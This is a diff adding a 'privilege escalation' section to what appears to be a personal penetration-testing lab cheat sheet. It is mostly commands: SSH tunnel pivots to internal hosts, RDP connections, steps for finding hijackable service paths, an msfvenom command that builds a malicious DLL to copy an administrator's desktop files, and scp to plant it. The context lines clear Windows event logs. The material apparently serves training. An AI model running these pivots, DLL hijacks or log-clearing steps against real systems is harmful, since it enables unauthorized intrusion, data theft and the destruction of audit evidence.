@@ -3526,6 +3526,25 @@ wevtutil clear-log Application
 Clear-Eventlog -Log Application, System
 
 
+## WINDOW PRIV ESCALATION FLAGS
+ssh -MS /tmp/jump student@10.50.39.67
+ssh -S /tmp/jump jump -O forward -L 1500:192.168.28.105:2222
+ssh -MS /tmp/T1 comrade@127.0.0.1 -p 1500
+ssh -S /tmp/T1 T1 -O forward -L 1501:192.168.28.5:3389
+xfreerdp /u:comrade /v:127.0.0.1:1501 -dynamic-resolution +glyph-cache +clipboard
+
+xfreerdp /u:comrade /v:127.0.0.1:10218 /dynamic-resolution +glyph-cache +clipboard
+loading channel cliprdr
+rm -f /home/student/.config/freerdp/known_hosts
+if you get a key error
+Check services
+look first for an empty description
+find path
+Check if you can write into the directory or rename the executable
+To check what account it will use on log on RC the file -> properties -> security
+msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\comrade.WIN2-INTERNAL-D /s"' -f dll > hijackmeplz.dll
+scp student@10.50.38.176:/home/student/hijackmeplz.dll “C:\Path to executable\hijackmeplz.dll”
+
 
 
 
